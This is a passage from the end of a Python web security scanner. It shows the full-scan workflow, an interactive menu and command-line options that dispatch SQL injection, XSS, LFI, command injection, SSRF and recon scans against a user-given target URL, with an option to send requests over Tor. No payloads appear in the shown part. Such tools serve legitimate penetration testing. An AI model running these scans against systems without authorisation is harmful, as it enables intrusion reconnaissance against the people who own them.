            executor.submit(ssrf_scan, url): "SSRF",
            executor.submit(xxe_scan, url): "XXE",
            executor.submit(graphql_scan, url): "GraphQL",
            executor.submit(jwt_scan, url): "JWT",
            executor.submit(check_api_security, url): "API Security",
            executor.submit(check_cloud_security, url): "Cloud Security",
            executor.submit(check_container_security, url): "Container Security"
        }
        
        for future in as_completed(futures):
            vuln_type = futures[future]
            try:
                result = future.result()
                if result:
                    print_success(f"{vuln_type} scan completed - vulnerabilities found!")
                else:
                    print_warning(f"{vuln_type} scan completed - no vulnerabilities detected.")
            except Exception as e:
                print_error(f"Error during {vuln_type} scan: {str(e)}")

    print_status("\nPhase 3: Threat Intelligence")
    try:
        domain = urlparse(url).netloc
        ip = socket.gethostbyname(domain)
        modern_threat_intel_lookup(ip, domain)
    except:
        print_warning("Threat intelligence lookup skipped")

    print_status("\nPhase 4: Website Crawling") 
    crawled_pages = crawl_website(url, CRAWL_LIMIT)
    
    print_status("\nPhase 5: Generating Report")
    save_vulnerabilities(url)
    
    print_success(f"\nComprehensive scan for {url} completed.")

def interactive_menu(url):
    while True:
        print_banner()
        print(f"\n{YELLOW}Target URL: {url}{RESET}")
        print(f"\n{CYAN}Select an option:{RESET}")
        print(f"  {GREEN}1{RESET} - DNS Lookup")
        print(f"  {GREEN}2{RESET} - WHOIS Lookup")
        print(f"  {GREEN}3{RESET} - GeoIP Lookup")
        print(f"  {GREEN}4{RESET} - Banner Grabbing")
        print(f"  {GREEN}5{RESET} - NMAP Scan")
        print(f"  {GREEN}6{RESET} - Subdomain Scan")
        print(f"  {GREEN}7{RESET} - Reverse IP Lookup")
        print(f"  {GREEN}8{RESET} - Check robots.txt")
        print(f"  {GREEN}9{RESET} - Check Admin Panels")
        print(f"  {GREEN}10{RESET} - SQL Injection Scan")
        print(f"  {GREEN}11{RESET} - XSS Scan")
        print(f"  {GREEN}12{RESET} - LFI Scan")
        print(f"  {GREEN}13{RESET} - Command Injection Scan")
        print(f"  {GREEN}14{RESET} - PHP Config Check")
        print(f"  {GREEN}15{RESET} - SSH Vulnerabilities Check")
        print(f"  {GREEN}16{RESET} - Patch Vulnerabilities Check")
        print(f"  {GREEN}17{RESET} - Bug Bounty Checks")
        print(f"  {GREEN}18{RESET} - Website Crawling")
        print(f"\n  {BLUE}[A]{RESET} - Full Scan")
        print(f"  {BLUE}[D]{RESET} - Change Target URL")
        print(f"  {BLUE}[O]{RESET} - Generate Full Report")
        print(f"  {BLUE}[Y]{RESET} - Back to Main Menu")
        print(f"  {BLUE}[Q]{RESET} - Quit")
        
        choice = input("\nEnter your choice: ").strip().upper()
        
        if choice == '1':
            dns_lookup(url)
        elif choice == '2':
            whois_lookup(url)
        elif choice == '3':
            geoip_lookup(url)
        elif choice == '4':
            grab_banners(url)
        elif choice == '5':
            nmap_scan(url)
        elif choice == '6':
            subdomain_scanner(url)
        elif choice == '7':
            reverse_ip_lookup(url)
        elif choice == '8':
            get_robots_txt(url)
        elif choice == '9':
            check_admin_panels(url)
        elif choice == '10':
            sql_injection_scan(url)
        elif choice == '11':
            xss_scan(url)
        elif choice == '12':
            lfi_scan(url)
        elif choice == '13':
            command_injection_scan(url)
        elif choice == '14':
            check_php_config_weakness(url)
        elif choice == '15':
            check_ssh_vulnerabilities(url)
        elif choice == '16':
            check_patch_vulnerabilities(url)
        elif choice == '17':
            check_bug_bounty_vulnerabilities(url)
        elif choice == '18':
            crawl_website(url, CRAWL_LIMIT)
        elif choice == 'A':
            full_scan(url)
        elif choice == 'D':
            new_url = input("Enter new target URL: ").strip()
            if not new_url.startswith('http://') and not new_url.startswith('https://'):
                new_url = 'http://' + new_url
            url = new_url
            continue
        elif choice == 'O':
            save_vulnerabilities(url)
        elif choice == 'Y':
            return
        elif choice == 'Q':
            sys.exit(0)
        else:
            print_error("Invalid choice. Please try again.")
        
        input("\nPress Enter to continue...")

def main():
    parser = argparse.ArgumentParser(
        description=f"{BANNER}",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument('url', nargs='?', help='Target URL for scanning (e.g., http://example.com)')
    parser.add_argument('-f', '--full', action='store_true', help='Perform a full scan including reconnaissance, vulnerability assessment, and crawling.')
    parser.add_argument('-r', '--recon', action='store_true', help='Perform reconnaissance scans (DNS, WHOIS, GeoIP, Banners, NMAP).')
    parser.add_argument('-v', '--vuln', action='store_true', help='Perform vulnerability scans (SQLi, XSS, LFI, Command Injection, PHP Config).')
    parser.add_argument('-c', '--crawl', action='store_true', help='Perform website crawling to discover pages.')
    parser.add_argument('-s', '--subdomains', action='store_true', help='Scan for subdomains.')
    parser.add_argument('-a', '--admin', action='store_true', help='Check for common admin panels.')
    parser.add_argument('-p', '--php', action='store_true', help='Check for PHP configuration weaknesses.')
    parser.add_argument('-ci', '--cmd-inject', action='store_true', help='Check for Command Injection vulnerabilities.')
    parser.add_argument('-ro', '--robots', action='store_true', help='Fetch and analyze robots.txt.')
    parser.add_argument('--tor', action='store_true', help='Use Tor network for requests (requires Tor to be running).')
    parser.add_argument('--save', action='store_true', help='Save the found vulnerabilities to a file.')
    
    args = parser.parse_args()
    
    global PROXIES
    if args.tor:
        PROXIES = TOR_PROXIES
        print_status("Using Tor network for requests.")
# developer • Younis Mohammed Abdulwahid Saleh
    if args.url:
        target_url = args.url
        if not target_url.startswith('http://') and not target_url.startswith('https://'):
            print_warning("URL does not start with http:// or https://. Assuming http://")
            target_url = 'http://' + target_url
            
        parsed_target = urlparse(target_url)
        if not parsed_target.netloc:
            print_error("Invalid URL provided.")
            return

        print_banner()
        
        if args.full:
            full_scan(target_url)
        else:
            tasks = []
            if args.recon:
                tasks.append(dns_lookup)
                tasks.append(whois_lookup)
                tasks.append(geoip_lookup)
                tasks.append(grab_banners)
                tasks.append(nmap_scan)
                tasks.append(subdomain_scanner)
                tasks.append(reverse_ip_lookup)
            if args.robots:
                tasks.append(get_robots_txt)
            if args.subdomains:
                tasks.append(subdomain_scanner)
            if args.admin:
                tasks.append(check_admin_panels)
            if args.php:
                tasks.append(check_php_config_weakness)
            if args.cmd_inject:
                tasks.append(command_injection_scan)
                
            if args.vuln:
                tasks.append(lambda u: sql_injection_scan(u))
                tasks.append(lambda u: xss_scan(u))
                tasks.append(lambda u: lfi_scan(u))
            
            if args.crawl:
                print_status("Website crawling initiated. This may take a while.")
                crawled_pages = crawl_website(target_url, CRAWL_LIMIT)

            if tasks:
                print_status("Starting selected scans...")
                for task in tasks:
                    try:
                        if task.__code__.co_argcount == 1:
                            task(target_url)
                        else: 
                            task()
                    except Exception as e:
                        print_error(f"Error executing task {getattr(task, '__name__', 'anonymous_task')}: {str(e)}")
            else:
                print_warning("No specific scan options were selected. Use -h for help.")

        if args.save:
            save_vulnerabilities(target_url)
            
        print_success("\nScan process finished.")
    else:
        #* By younis • younistrck*
        print_banner()
        target_url = input("Enter target URL (e.g., http://example.com): ").strip()
        if not target_url.startswith('http://') and not target_url.startswith('https://'):
            target_url = 'http://' + target_url
            
        parsed_target = urlparse(target_url)
        if not parsed_target.netloc:
            print_error("Invalid URL provided.")
            return
            
        interactive_menu(target_url)

if __name__ == "__main__":
    main()
